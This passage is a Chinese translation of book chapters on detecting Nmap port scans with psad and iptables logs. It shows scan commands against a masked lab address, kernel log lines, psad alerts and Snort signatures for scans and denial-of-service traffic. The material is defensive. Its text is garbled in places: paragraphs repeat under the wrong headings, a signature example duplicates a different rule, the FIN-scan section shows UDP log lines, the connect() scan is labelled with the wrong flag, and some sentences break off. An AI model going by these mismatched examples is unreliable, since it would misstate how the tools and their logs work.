在本章中，我们将重点关注分析在没有使用 `iptables` 字符串匹配扩展的情况下生成的 `iptables` 日志。我们的精力将集中在通过检查网络层和传输层报头来检测恶意网络流量，而不是查看应用层。在第 11 章中，我们将大量使用字符串匹配扩展来进入应用层攻击检测的领域，但目前，我们将通过解析 `iptables` 日志消息展示 `psad` 如何检测端口扫描、后门探测和其他可疑流量。

本章旨在向您介绍 `psad` 的操作方面，包括攻击检测和告警。更高级的主题，如签名检测、操作系统指纹识别和 DShield 报告，将在第 7 章中涵盖，而将 `psad` 作为主动响应工具的使用将在第 8 章和第 11 章中介绍。我们首先将展示一些类 `psad` 仅通过监控 `iptables` 日志消息就能检测到的攻击和可疑流量。

# 使用 psad 进行端口扫描检测

尽管今天许多攻击已移动到应用层，但仍有大量的可疑活动在传输层及以下表现出来。

TCP/IP 协议簇的任何完整实现都是一组庞大且复杂的代码，这种复杂性使其成为从侦察工作到拒绝服务攻击等一切极具吸引力的目标。本节将说明针对 `iptablesfw` Linux 系统的几种攻击和探测，并引用图 1-2 中的网络图（在下方重复显示为图 6-1）。这次，`psad` 也被部署在 `iptablesfw` 系统上，并配有第 1 章中中讨论的由 `iptables.sh` 脚本构建的默认策略，该脚本可在 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls) 获取。本节讨论的所有攻击都是在内核中启用 `iptables` 策略的情况下针对 `iptablesfw` 系统发送的。该策略的默认日志立场就是 `psad` 检测可疑活动所需的全部；不需要额外的 `iptables` 特性（如字符串匹配）。

![默认网络图](img/httpatomoreillycomsourcenostarchimages207392.png)

图 6-1. 默认网络图

端口扫描是询问远程目标的一种重要技术，`psad` 的开发目标主要是为 Linux 系统提供高级的端口扫描检测。本节的首要任务是说明各种类型的端口扫描，并查看它们是如何出现在您的 `iptables` 日志中的。

与第 3 章一样，我们再次使用 `Nmap` 对系统进行端口扫描。然而，这次扫描目标运行着 `psad`，以便可以分析 `iptables` 日志。我们将使用 `Nmap` 生成以下类型的端口扫描，然后查看 `psad` 如何检测它们：

*   TCP `connect()` 扫描
*   TCP FIN、XMAS 和 NULL 扫描
*   TCP SYN 或半开扫描
*   UDP 扫描

### 注意

请参阅第 3 章获取有关这些扫描技术的技术描述。

每次扫描都是从 `ext_scanner` 系统启动的，如图 6-1](#ch06.html_default_network_diagram-id2 "图 6-1. 默认网络图")所示，针对 `iptables` 防墙的外部 `71.157.*X.*X*` IP 地址。在发送第一次扫描之前，我们确保 `psad` 运行在 `iptables` 防墙上，并在 `/etc/psad/psad.conf` 文件中有默认的 `DANGER_LEVEL{n}` 设置：

```
 [iptablesfw]# /etc/psad/init.d/psad start
Starting psad ...                                [ ok ]
```

NMAP 与往返时间

在本文节的大多数扫描示例中，`Nmap` 计时选项（例如 `-T` 和 `--max-rtt-timeout`）会影响 `Nmap` 扫描目标的速度。由于 `iptables` 严格限制了本地栈可以向每个扫描探测针发送的响应，您可以限制 `Nmap` 等待永远不会到达的响应的时间。例如，当 `Nmap` 向端口 5000 发送 `SYN` 数据包时，`iptables` 会丢弃它，因此 `Nmap` 期的 `SYN/ACK` 或 `RST/ACK` 永远由目标栈发送。通过缩短 `Nmap` 等待此响应的时间（使用 `--max-rtt-timeout` 选项），我们可以减少扫描系统总时间。（确定 `--max-rtt-timeout` 值良好上限的一种方法是使用 `ping` 工具在开始扫描之前测量到目标的往返时间。）

## TCP connect() 扫描

`Nmap` TCP `connect()` 扫描模式 (`-sS`) 在第 3 章中引入，可供 Unix 风格操作系统上的非特权用户使用。我们首先针对目标 IP 地址 `71.157.*X.*X*` 这种扫描：

```
 [ext_scanner]$ nmap -sT -n 71.157.X.X --max-rtt-timeout 500

Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-07-08 23:22 EST
Interesting ports on 71.157.X.X:
(The 1671 ports scanned but not shown below are in state: filtered)
PORT   STATE SERVICE
80/tcp open  http

Nmap finished: 1 IP address (1 host up) scanned in 22.551 seconds
```

总共扫描了 1671 个 TCP 端口（❶），几乎所有端口都如预期被过滤了（❷），因为 `iptables` 丢弃了大多数的连接尝试。只有 HTTP 端口是开启的（❸）。扫描完成后，我们检查 `/var/log/messages` 文件查看 `psad` 是否检测到了扫描。确实，那里出现了以下系统日志：

```
 Jul  8 23:22:29 iptablesfw psad: scan detected: 144.202.X.X -> 71.157.X.X: tcp:
[1-65301] flags: SYN tcp pkts: 1532 DL: 4
```

`psad` 系统日志消息显示了源和目的 IP 地址、扫描的 TCP 端口范围（1-65301）、发送的标志（在本例中为 SYN）、发送包数以及 `psad` 分配给扫描器的危险级别（DL: 4）。

在这种情况下，`psad` 监控到的包数量为 1532（见上方 ❹），这超过了达到危险级别 4 所需的 1500 个包（由 `/etc/psad/psad.conf` 中的 `DANGER_LEVEL4` 变量定义）。`psad` 还会生成电子邮件告警，它们包含的信息比单行系统日志能包含的多得多。（请参阅第 108 页的“psad 告警”获取 `psad` 电子邮件告警的完整示例。）





要查看 psad 用于检测扫描的 iptables 日志消息，请检查 `/var/log/psad/fwdata` 文件。（请记住 psad 正在运行，因此 `kmsgsd` 会通过 syslog 接收 iptables 日志消息并将其写入 `/var/log/psad/fwdata` 文件；关于 `kmsgsd` 的更多信息可以参阅第 5 章
Jul  8 23:22:04 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00
 :30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=60 TOS=0x00
 PREC=0x00 TTL=64 ID=53661 DF PROTO=TCP SPT=59480 DPT=256 WINDOW=5840 RES=0x00
 SYN URGP=0 OPT (020405B40402080A31CAD9280000000001030306)
Jul  8 23:22:04 iptablesfw kernel: DROP IN:eth0 OUT= MAC=00:13:d3:38:b6:e4:00
 :30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=60 TOS=0x00
 PREC=0x00 TTL=64 ID=36136 DF PROTO=TCP SPT=60134 DPT=3389 WINDOW=5840 RES=0x00
 SYN URGP=0 OPT (020405B40402080A31CAD9280000000001030306)
```

注意日志消息中的几个字段以加粗显示。上述 ❶ 处的字段显示输出接口为空，该字符串是 `OUT=`。这告诉我们，产生日志消息的数据包要么命中了 iptables `INPUT` 链内部的 `LOG` 规则，要么命中了内核在进行路由计算之前的链中的 `LOG` 规则（例如 `raw` 表中的 `PREROUTING` 链）。

由于 iptables 日志格式没有显式包含包含 `LOG` 规则的 iptables 链，我们无法从上面的日志消息判断数据包是从 `INPUT` 链还是 `PREROUTING` 链记录的。然而，由于大多数 iptables 策略会在 `INPUT`、`FORWARD` 或 `OUTPUT` 链中设置默认 `LOG` 规则，而不是 `PREROUTING` 或 `POSTROUTING` 链，psad 假设以下规则适用于所有 iptables 日志消息：

- 不包含输出接口的消息在 `INPUT` 链中记录。
- 不包含输入接口的消息在 `OUTPUT` 链中记录。
- 同时包含输入接口和输出接口的消息在 `FORWARD` 链中记录。

因此，对于上述讨论的 TCP `connect()` 扫描，psad 假设扫描是通过 `INPUT` 链记录的，考虑到 `iptables.sh` 脚本构建的 iptables 策略，这是正确的。因为源 IP 地址 `144.202.*X.*X` 包含在❷ 处的日志消息中，psad 知道扫描的来源。

### 注意

请记住，扫描有时是故意伪装的，因此此 IP 地址不能完全信任为扫描的真实来源。当以 root 身份执行时，Nmap 可以使用诱饵选项（`-D`）发送伪装扫描，而 `Idle` 扫描将 IP 伪装作为核心组成部分。

上述 iptables 日志消息中 ❸ 处的后续三个加粗字符串表示被扫描的协议和端口，以及使用的标志。在这个示例中，扫描器对 TCP 端口感兴趣，扫描包仅设置了 SYN 标志。

回想一下，上述 `connect()` 扫描中 Nmap 总共扫描了 1,671 个端口，但只有 1,532 条 iptables 日志写入了 `/var/log/psad/fwdata` 文件。这种差异源于两个因素：iptables 快速生成日志消息的能力，以及 Nmap 的 SYN 数据包重传。由于 iptables 内部记录到内核中的环形缓冲区，如果流量速率足够快，以至于在旧消息写入 `/var/lib/psad/psad` 命名管道之前就被新消息覆盖，那么这些消息就会丢失。这种折衡是你的机器可以保持运行并继续保持良好的性能，代价是丢失几条日志消息（这似乎是一个很好的折衡）。由于 Nmap 通常对每个响应的端口发送一次重试，Nmap 为此扫描实际上发送了超过 3,300 个数据包（内核环形缓冲区无法跟上这种包速率，因此一半的数据包未被记录）。

## TCP SYN 半开放扫描

现在我们转向 Nmap 的 SYN（半开放）方法。SYN 扫描是 Nmap 在由特权用户执行时的默认扫描类型（事实上，此扫描类型以及所有其他 Nmap 扫描类型都需要访问原始套接字，因此必须由特权用户执行）。由于目标系统上的 iptables 防火墙配置为丢弃所有指向 TCP 端口 80 的 SYN 数据包，因此在链路上查看，SYN 扫描与普通的 `connect()` 扫描几乎相同，因为 TCP 栈没有足够的 SYN/ACK 数据包可以响应。我们只看到来自同一源的 SYN 包，别无其他。这种推理在理论上通常是合理的，但在实践中，当初始 SYN 数据包都被 iptables 丢弃时，我们看到 SYN 扫描和 `connect()` 扫描之间存在若干差异。这些差异出现在 Nmap 发送的 SYN 数据包与 TCP 栈发送的包包的具体头部字段中（见第 3 章）。本节的其余部分说明了每次扫描中 SYN 包的特定差异，以及你如何在 `iptablesfw` 系统的 iptables 日志中看到这些差异。以下命令对目标 IP 地址 `71.157.*X.*` 启动 SYN 扫描：

```bash
ext_scanner]# nmap -n 71.157.X --max-rtt-timeout 500
Starting Nmap 4.03 (http://www.insecure.org/nmap) at 2007-07-13 13:58 EDT
Interesting ports on 71.157.X:
1672 ports scanned but not shown are in state: filtered
PORT   STATE
80/tcp open
Nmap finished: 1 IP address (up) scanned in 22.611 seconds
```

快速检查 `/var/log/messages` 文件显示 psad 检测到了扫描：

```
 Jul  13 13:58:10 iptablesfw psad: scan detected: 144.202.X -> 71.157.X tcp: [1-65301] flags: SYN pkts: 1542 DL: 4
```

扫描器达到了危险级别 4，因为已发送了超过 1500 个包，这超过了 `psad.conf` 文件中的 `DANGER_LEVEL` 变量。再次在目标系统上，iptables 记录了来自扫描的每个 SYN 包：

```
 Jul  13 13:58:04 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00
:30:48:
80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=44 TOS=0x00
PREC=0x00 TTL=64 ID=27267 PROTO=TCP SPT=62316 DPT=7200 WINDOW=2048 RES=0x00
 SYN URGP=0 OPT (020405B4)
Jul  13 13:58:04 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00
 :30:48:
80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=44 TOS=0x00
PREC=0x00 TTL=64 ID=29182 PROTO=TCP SPT=62316 DPT=5001 WINDOW=4096 RES=0x00
 SYN URGP=0 OPT (020405B4)
Jul  13 13:58:04 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00
 :30:48:
80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=44 TOS=0x00
PREC=0x00 TTL=64 ID=39294 PROTO=TCP SPT=62315 DPT=3264 WINDOW=4096 RES=0x00
 SYN URGP=0 OPT (020405B4)
```




IP 头部中的生存时间（TTL）值在 TCP `connect()` 扫描期间，客户端系统上的真实 IP 协议栈始终被初始化为相同的值。然而，由于 Nmap 在 SYN 扫描中是手工构造 TCP SYN 数据包，它可以将 TTL 值设置为任何它想要的值，并在 37 到 60 之间随机选择 TTL 值。

### `WINDOW`
在 SYN 扫描期间，Nmap 将 TCP 窗口大小设置为 1024、2048、3072 或 4096。相比之下，真实的 TCP 协议栈始终以 5840 的窗口大小启动 TCP 连接。

### `OPT`
在 Nmap SYN 扫描中，TCP 头部的选项（options）部分短得多。在这种情况下，它使用单个选项，即最大段大小（Maximum Segment Size），并将其设置为 1460。大多数真实的 TCP 协议栈会发送多个选项，例如时间戳（Timestamp`）、空操作（`NOP`）以及是否支持选择确认（`SACK`）。你可以在第 122 页的“使用 psad 模拟 p0f”中找到更多关于解码 iptables 消息中 `OPT` 字符串的信息。

## TCP FIN、XMAS 和 NULL 扫描
Nmap 的 FIN、XMAS 和 NULL 扫描在用 iptables 日志消息表示时非常相似。事实上，这些扫描类型之间唯一的显著区别是所使用的 TCP 标志组合——这种差异体现在 TCP 数据包的 iptables 日志格式的标志部分。此外，由于 FIN、XMAS 和 NULL 扫描分别由一个特定的 Snort 规则表示，且该规则不需要应用层检查，psad 可以通过单个数据包检测这些扫描，而无需依赖数据包计数和端口范围。

#### FIN 数据包与 Netfilter 连接跟踪
在合法的 TCP 通信中找到设置了 `FIN` 标志的 TCP 数据包是正常的；它表示 TCP 连接的一侧没有更多数据要发送并正在关闭连接。因此，为了让 psad 能够有效区分 FIN 扫描和合法的 FIN 数据包，使用 Netfilter 的连接跟踪机制接受所有匹配 `ESTABLISHED` 状态的数据包，并记录和丢弃其余包是非常。意外的 FIN 数据包匹配 Netfilter 的 `INVALID` 状态，因为它们不是任何已建立 TCP 连接的一部分，因此在第 1 章中 `iptables.sh` 脚本构建的 iptables 策略早期就被记录并丢弃。

你可以通过 Nmap 相应的命令行参数 `-sF`、`-sN` 和 `-sX` 启动 FIN、XMAS 和 NULL 扫描。为了简洁起见，我们仅下方显示 FIN 扫描：

```
 [ext_scanner]# nmap -sF -n 71.157.X.X --max-rtt-timeout 5

Starting Nmap 4.03 ( http://www.insecure.org/nmap/ ) at 2007-07-13 14:39 EDT
All 1674 scanned ports on 71.157.X.X are: open|filtered

Nmap finished: 1 IP address (1 host up) scanned in 36.223 seconds
```

如你所见，FIN 扫描没有逃过 psad 的监视：

```
 Jul  13 14:39:10 iptablesfw psad: scan detected: 144.202.X.X -> 71.157.X.X
tcp: [1-65295] flags: FIN tcp pkts: 1511 DL: 4
```

我们在 `/var/log/psad/fwdata` 文件中看到了许多类似于下例的日志消息。`FIN` 标志列在 ❷，带有 `DROP INVALID` 日志前缀 ❶，这显示 `INVALID` 状态日志规则匹配了数据包：




```
 Jul 13 15:24:01 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00: 30:48:
80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=28 TOS=0x00 PREC=0x00 TTL=53
ID=28505 PROTO=UDP SPT=36194 DPT=306 LEN=8
Jul 13 15:24:01 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00: 30:48:
80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=28 TOS=0x00 PREC=0x00 TTL=43
ID=8432 PROTO=UDP SPT=36194 DPT=436 LEN=8
Jul 13 15:24:01 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00: 30:48:
80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=28 TOS=0x00 PREC=0x00 TTL=37
ID=42032 PROTO=UDP SPT=36194 DPT=31 LEN=8
```

* * *

¹ 4.02 之前的 Nmap 版本在 SYN 数据包中完全不发送任何 TCP 选项，这在网络流量中查找 Nmap 扫描时是一个非常有用的事实，因为它能为你提供更多关于潜在敌对手信息。

## 使用 psad 进行告警和报告

一旦 `psad` 确定针对 `iptables` 发生了可疑事件或一系列事件，它就会向管理员告警。它的目标是提供尽可能多的信息，以便人员确定适当的响应。默认情况下，`psad` 会同时生成电子邮件和 syslog 告警，正如我们在本节中的示例所示。

## psad 电子邮件告警

电子邮件是 `psad` 主要的告警机制，因为电子邮件包含的信息比 syslog 告警多，而且电子邮件无处不在，并与手机和其他手持设备良好集成。检查电子邮件几乎总是很容易。

以下是一个典型的 `psad` 电子邮件告警示例。此特定告警是在 `psad` 检测到来自图 6-1 所示的 `int_scanner`系统的 TCP `connect()` 扫描后发送的。（我们将在后续章节中介绍整个告警，因为这是书中第一个此类示例。）后续章节讨论的完整 `psad` 告警示例可以从 `http://www.cipherdyne.org/linuxfirewalls` 下载。

### 扫描级别、端口和标志

`psad` 电子邮件告警中包含的第一部分信息是分配给扫描源地址的危险级别、被扫描端口以及扫描中设置的标志（针对 TCP 扫描）。在下面的 `psad` 告警片段中，危险级别被设置为 4，因为扫描涉及的数据包数量和端口范围超过了 `/etc/psad/psad.conf` 文件中 `DANGER_LEVEL4` 和 `PORT_RANGE_SCAN_THRESHOLD` 变量分别要求的默认值（分别为 1,500 和 1）。此外，由于源 IP 地址未包含在 `/etc/psad/auto_dl` 文件中，`psad` 不为源 IP 地址分配危险级别。由于扫描没有触发任何危险级别高于 4 的签名，我们留下的危险级别仅根据数据包计数和扫描端口的范围确定的。

接下来，我们看到最小 TCP 端口号为 1，最大为 61,440。此范围内的并非每个端口都已扫描，因为即使没有重传，这也至少需要 61,440 个 SYN 数据包（在这种情况下会发生重传，因为我们正在使用 `connect()` 扫描）。默认情况下，如果没有显式给 Nmap 指定扫描端口范围，它将扫描一组有趣的端口，这些端口源于与 Nmap 源码绑定的 `nmap-services` 文件，我们看到在此扫描中仅设置了 SYN 标志。从 `iptables` 的角度来看，标志意味着给 Nmap 传递了 `-sT` 或 `-sS` 命令行参数。最后显示了日志前缀，在本例中，扫描的每个数据包都由 `iptables` 以 `DROP` 为前缀进行记录。

```
Danger level: [4] (out of 5)
Scanned tcp ports: [1-61440: 1522 packets]
tcp flags: [SYN]
iptables: DROP
```

### 源地址和目的地址

源 IP 地址未包含在 `/etc/psad/auto_dl` 文件中，`psad` 不为源 IP 地址分配危险级别。由于扫描没有触发任何危险级别高于 4 的签名，我们留下的危险级别仅根据数据包计数和扫描端口的范围确定的。

接下来，我们看到最小 TCP 端口号为 1，最大为 61,440。此范围内的并非每个端口都已扫描，因为即使没有重传，这也至少需要 61,440 个 SYN 数据包（在这种情况下会发生重传，因为我们正在使用 `connect()` 扫描）。默认情况下，如果没有显式给 Nmap 指定扫描端口范围，它将扫描一组有趣的端口，这些端口源于与 Nmap 源码绑定的 `nmap-services` 文件，我们看到在此扫描中仅设置了 SYN 标志。从 `iptables` 的角度来看，标志意味着给 Nmap 传递了 `-sT` 或 `-sS` 命令行参数。

### 主机、间隔和摘要

扫描没有触发任何危险级别高于 4 的签名，我们留下的危险级别仅根据数据包计数和扫描端口的范围确定的。接下来，我们看到最小 TCP 端口号为 1，最大为 61,440。

### 数据库

以下是一个典型的 `psad` 电子邮件告警示例。此特定告警是在 `psad` 检测到来自图 6-1 所示的 `int_scanner`系统的 TCP `connect()` 扫描后发送的。

```
OrgName:    Internet Assigned Authority
OrgID:      IANA
Address:    4676 Admiralty Way, Suite 330
City:       Marina del
StateProv:  CA
PostalCode: 90292-6695
Country:    US

NetRange:   192.168.0.0 - 192.168.255.255
CIDR:       192.168.0.0/16
NetName:    IANA-CBLK1
NetHandle:  NET-192-168-0-0
Parent:     NET-192-0-0-0
NetType:    IANA Special Use
NameServer: BLACKHOLE-1.IANA.ORG
NameServer: BLACKHOLE-2.IANA.ORG
Comment:    此区块保留供特殊用途。
Comment:    更多信息请参见 RFC 1918。
Comment:
RegDate:    1994-03-15
Updated:    2002-09-16

OrgAbuseHandle: IANA-IP-ARIN
OrgAbuseName:   Internet Corporation for Assigned Names and Number
OrgAbusePhone:  +1-310-301-5820
OrgAbuseEmail:  abuse@iana.org

OrgTechHandle: IANA-IP-ARIN
OrgTechName:   Internet Corporation for Assigned Names and Number
OrgTechPhone:  +1-310-301-5820
OrgTechEmail:  abuse@iana.org

```

# ARIN WHOIS 数据库，最后更新于 2006-06-09 19:10
# 输入 ? 获取搜索 ARIN WHOIS 数据库的更多提示

## psad syslog 报告

除了电子邮件告警外，syslog 是 `psad` 的一个重要报告机制。在正常运行期间，`psad` 生成三类 syslog 告警。

### 信息消息

`psad` 定期生成信息性 syslog 消息，旨在向您告知 `psad` 执行的管理活动，例如导入配置文件和来自之前的 `psad` 执行的扫描信息。




例如，`psad` 在启动时向 syslog 写入以下消息：

```
 Jul 10 13:58:07 iptablesfw psad: imported valid icmp types and codes
Jul 10 13:58:07 iptablesfw psad: imported p0f-based passive OS fingerprinting
signatures
Jul 10 13:58:07 iptablesfw psad: imported TOS-based passive OS fingerprinting
signatures
Jul  10 13:58:07 iptablesfw psad: imported Snort classification.config
Jul 10 13:58:07 iptablesfw psad: imported original Snort rules in /etc/psad/snort_
rules/ for reference info
Jul 10 13:58:07 iptablesfw psad: imported 205 psad Snort signatures from /etc/psad/
signatures
```

### 扫描与特征匹配消息

最重要的 syslog 消息类别会通知你有关扫描和其他可疑流量。这些消息包含了从源 IP 地址到端口、协议以及 Snort 规则匹配的所有内容，接下来的 syslog 消息显示了一组 `psad` 扫描警报。请注意其中包含了 TCP 标志信息，以便你识别由 `psad` 检测到的扫描类型：

```
 Jul 13 14:51:48 iptablesfw psad: scan detected: 144.202.X.X -> 71.157.X.X tcp:
[15018-15095] flags: FIN tcp pkts: 10 DL: 2
Jul 13 15:22:38 iptablesfw psad: scan detected: 144.202.X.X -> 71.157.X.X tcp:
[234-40200] flags: SYN tcp pkts: 22 DL: 2
Jul 13 17:12:32 iptablesfw psad: scan detected: 144.202.X.X -> 71.157.X.X tcp:
[15018-15095] flags: NULL tcp pkts: 45 DL: 2
```

### 自动响应消息

我们可以通过 `psad` 针对流量源 IP 地址实例化 `iptables` 拦截规则来响应可疑流量。此功能默认禁用，但以下是几条显示创建和销毁拦截规则的 syslog 消息：

```
 Jul 12 00:06:37 iptablesfw psad: added iptables auto-block against 144.202.X.X for
3600 seconds
Jul 12 01:06:42 iptablesfw psad: removed iptables auto-block against 144.202.X.X
Jul 12 02:14:06 iptablesfw psad: added iptables auto-block against 22.1.X.X for
3600 seconds
Jul 12 03:14:11 iptablesfw psad: removed iptables auto-block against 22.1.X.X
```

这些 syslog 消息显示了源 IP 地址（`144.202.*X.*X`）被添加到 `iptables` 策略中的秒数，带有 `INPUT`、`OUTPUT` 和 `FORWARD` 链中的 `DROP` 规则。同时显示的 syslog 警报显示了从运行中的 `iptables` 策略中删除了 `DROP` 规则。

### 注意事项

关于响应功能的详细讨论，请参见 第 8 章 和 第 11 章。

***

² 这并不意味着任何形式的自动响应。作为被扫描和探测的系统的管理员，你可能希望手动拨打电话与违规 IP 地址的上游提供商联系。

# 结语

本章介绍了 `psad` 在操作方面的介绍，因为它如何检测并报告针对 `iptablesfw` 系统使用 `Nmap` 发起的端口扫描。电子邮件报告是 `psad` 主要警报机制，但 `psad` 也提供 syslog 警报。在下一章中，我们将探索更高级的 `psad` 主题，例如通过 `iptables` 日志消息检测匹配 Snort 规则的流量。

# 第 7 章 高级 PS 题：从特征匹配到操作系统指纹

到目前为止，我们已经看到 `psad` 分析 `iptables` 日志消息以检测端口扫描。在本章中，我们将进一步扩展攻击检测主题；可以检测匹配 Snort 特征集中特征的某些攻击，并在某些情况下可以对远程操作系统进行指纹识别。我们还将如何从 `psad` 提取详细状态信息，并介绍 DShield 报告功能。

## 使用 Snort 规则进行检测

由于 `iptables` 日志格式非常完整，`psad` 可以检测到缺少应用层匹配标准的匹配 Snort 规则的流量。例如，考虑以下 Snort 规则，它寻找源端口为 10101、确认值为 0、设置了 SYN 标志且 IP 头部中 TTL 值大于 220 的 TCP 包。

```
 alert tcp $EXTERNAL_NET 10101 -> $HOME_NET any (msg:"SCAN myscan"; flow:stateless;
ack:0; flags:S; ttl:>220; reference:arachnids,439; classtype:attempted-recon;
sid:
613; rev:6;)
```

此 Snort 规则中没有检查应用层数据的测试，Snort 规则集中大约有 150 条这样的规则。`psad` 从 `/etc/psad/signatures` 文件导入所有这些规则的修改版本。如果你查看 `/etc/psad/signatures` 文件中的某个随机特征，例如 `BAD-TRAFFIC data in TCP SYN packet` 特征（所示），你可以看到 `psad` 使用在 ❶、❷ 和 ❸ 处显示的某些额外关键字扩展了通常的 Snort 规则语法：

```
 alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN myscan"; flow:stateless;
ack:0; flags:S; ttl:>220; reference:arachnids,439; classtype:attempted-recon;
sid:
613; rev:6;)
```




`ipEye` 端口扫描器 ([`ntsecurity.nu/toolbox/ipeye`](http://ntsecurity.nu/toolbox/ipeye)) 是一款允许用户对远程主机进行端口扫描的软件。从意义上说，`ipEye` 类似于 `Nmap`（尽管功能远没有那么），它运行在 Windows 系统上。Snort 规则 ID `622` 用于检测网络上是否正在使用 `ipEye` 扫描器：

```
 alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN ipEye SYN scan"; flags:S;
seq:1958810375; reference:arachnids,236; classtype:attempted-recon; sid:622; psad_id:
100197; psad_dl:2;)
```

上述 Snort 规则不需要使用任何应用层测试；它只是检测 TCP 头部中是否设置了 `SYN` 标志和特定的 TCP 序列号 `1958810375`（这些测试在上述加粗显示）。

要使用 `psad` 检测 `ipEye` 扫描器的实例，必须在 `iptables` 命令行上提供 `--log-tcp-sequence` 选项，以便 `iptables` 在数据包命中 `LOG` 规则时在日志中包含 TCP 序列号。任何包含 `SYN` 标志和序列号 `1958810375`（下方加粗显示）的 `iptables` 日志消息都将触发 `psad` 中的签名匹配：

```
 Jul 11 20:28:21 iptablesfw kernel: DROP IN=eth1 OUT= MAC=00:13:46:3a:41:4b:00:a0:cc:
28:42:5a:08:00 SRC=192.168.10.3 DST=192.168.10.1 LEN=60 TOS=0x10 PREC=0x00 TTL=64 ID=
3970
DF PROTO=TCP SPT=45664 DPT=15324 SEQ=1958810375 ACK=0 WINDOW=5840 RES=0x00 SYN
URGP=0
```

当 `psad` 运行时，`/var/log/messages` 中会出现包含 `signature match` 词的以下 syslog 消息，表示 `psad` 已检测到 `ipEye` 扫描器：

```
 Jul 11 20:28:25 iptablesfw psad: src: 192.168.10.3 signature match: "SCAN ipEye SYN
scan" (sid: 622) tcp port: 15324
```

### 检测 LAND 攻击

LAND 攻击是一种经典的攻击。它是一种针对 Windows 系统的拒绝服务攻击，涉及构造一个源 IP 地址与其自身目标 IP 地址相同的 TCP `SYN` 数据包。在 Snort 签名 rule 签名集中，检测 LAND 攻击的关键是 `sameip` 数据包头部测试。Snort 规则 ID `527` 的修改版本（最初位于 Snort 的 `bad-traffic.rules` 文件中）允许 `psad` 在 `iptables` 日志中检测此类攻击（见下方加粗显示的 `sameip` 测试）：

```
 alert ip any any -> any any (msg:"BAD-TRAFFIC same SRC/DST"; sameip; reference:
bugtraq,2666; reference:cve,1999-0016; reference:url,www.cert.org/advisories/CA-1997-
28.html; classtype:bad-unknown; sid:527; psad_id:100103; psad_dl:2;)
```

`psad` 通过检查 `iptables` 日志中的 `SRC` 和 `DST` 字段是否相同来整合 `sameip` 测试。然而，为了减少误报，通过环回接口记录的流量被排除在此检查之外。

由于 `SRC` 和 `DST` 字段始终被包含在 `iptables` 日志消息中，因此在构建 `LOG` 规则时，不需要为 `iptables` 任何特殊的命令行参数，`psad` 即可检测到与 LAND 攻击相关的流量。以下行表示由 LAND 攻击生成的 `iptables` 日志消息（注意源和目标 IP 地址相同），随后是相应的 `psad` syslog 警报：

```
 Jul 11 20:31:35 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00:13:46:
c2:60:44:08:00 SRC=192.168.10.3 DST=192.168.10.3 LEN=60 TOS=0x10 PREC=0x00 TTL=63
ID=46699 DF PROTO=TCP SPT=57278 DPT=15001 WINDOW=5840 RES=0x00 SYN URGP=0 Jul 11 20:
31:38
iptables psad: src: 192.168.10.3 signature match: "BAD-TRAFFIC same SRC/DST" (sid:
527)ip
```

## 检测 TCP 端口 0 

尽管合法的 TCP 连接不会通过端口 0 传输，但并没有什么阻止人们在线路上发送目标为端口 0 的 TCP 数据包。事实上，`Nmap` 在 3.50 版本中获得了扫描端口 0 的能力。原始 Snort 规则 ID `524`（注意显示的端口值）检测发送到目标端口 0 的 TCP 数据包，对于 UDP 端口 0 也有类似的规则：

```
 alert tcp $EXTERNAL_NET any <> $HOME_NET 0 (msg:"BAD-TRAFFIC tcp port 0"; classtype:misc-activity; sid:524; psad_id:1001;)
```

在 `DPT` 字段中包含值 `0` 的 `iptables` 日志消息将触发 `psad` 中的此签名，其包含 `DPT=0`，如下所示：

```
 Jul 11 21:02:07 iptablesfw kernel: DROP IN=eth1 OUT= MAC=00:13:d3:38:b6:e4:00:13:46:
c2:60:44:08:00 SRC=192.168.10.3 DST=192.168.10.1 LEN=44 TOS=0x10 PREC=0x00 TTL=41
ID=43697 PROTO=TCP SPT=29121 DPT=0 WINDOW=3072 RES=0x00 SYN URGP=0 Jul 11 21:02:11
iptablesfw psad: src: 192.168.10.3 signature match: "BAD-TRAFFIC tcp port 0"
(sid: 524)
```

### 检测零 TTL 流量

与 TCP 和 UDP 端口 0 一样，在路上放置一个 TTL 值为零的数据包是可能的。尽管路由 IP 数据包的设备不应转发此类数据包，但系统可以针对二层设备（如交换机或网桥）连接的任何系统发送此类数据包。Snort 规则 ID `1321` 检测 `TTL` 值设置为零的 IP 数据包，下方对应的对应的 `iptables` 消息所示：

```
 alert ip $EXTERNAL_NET any -> $HOME_NET any (msg:"BAD-TRAFFIC 0"; ttl:0;
reference:url,support.microsoft.com/default.aspx?scid=kb-EN-US;q138268; reference:
url, www.isi.edu/in-notes/rfc1122.txt; classtype:misc-activity; sid:1321; psad_id:
10104;psad_dl:2;)
```

在 `TTL` 字段中包含值 `0` 的 `iptables` 日志消息将触发 `psad` 中的此签名，其包含 `TTL=0`，所示：

```
 Jul 14 15:33:28 iptables kernel: IN=eth1 OUT= MAC=00:13:46:3a:41:4b:00:13:46:
c2:60:44:08:00 SRC=192.168.10.3 DST=192.168.10.1 LEN=104 TOS=0x10 PREC=0x00 TTL=0 ID=8 TYPE=0 Jul 14 15:33:31 iptablesfw psad: src:
192.168.10.3 signature match: "BAD-TRAFFIC 0" (sid: 1321)

## 检测 Naptha 拒绝服务攻击

